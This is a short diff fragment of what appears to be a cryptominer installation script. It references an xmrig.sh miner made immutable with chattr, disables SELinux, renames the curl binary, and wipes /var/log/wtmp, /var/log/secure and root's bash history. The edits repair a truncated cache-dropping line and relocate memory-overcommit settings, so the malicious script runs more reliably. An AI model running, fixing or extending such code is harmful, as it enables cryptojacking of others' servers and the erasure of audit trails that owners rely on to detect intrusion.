@@ -891,6 +891,7 @@ chattr -V +iau $HOME/myssqltcp/xmrig.sh
 setenforce 0 2>dev/null
 echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
 sync && echo 3 >/proc/sys/vm/dro
+sync && echo 3 >/proc/sys/vm/drop_caches
 
 bbdir="/usr/bin/curl"
 bbdira="/usr/bin/cd1"
@@ -927,8 +928,8 @@ echo > /var/log/wtmp
 echo > /var/log/secure
 echo > /root/.bash_history
 
+sysctl -w vm.overcommit_memory=2
+echo "vm.overcommit_memory=2" >> /etc/sysctl.conf
 echo "[*] Setup complete"
 echo "[*] Yee-Go"
-sysctl -w vm.overcommit_memory=2
-echo "vm.overcommit_memory=2" >> 
-echo "vm.overcommit_memory=2" >> /etc/sysctl.conf
+
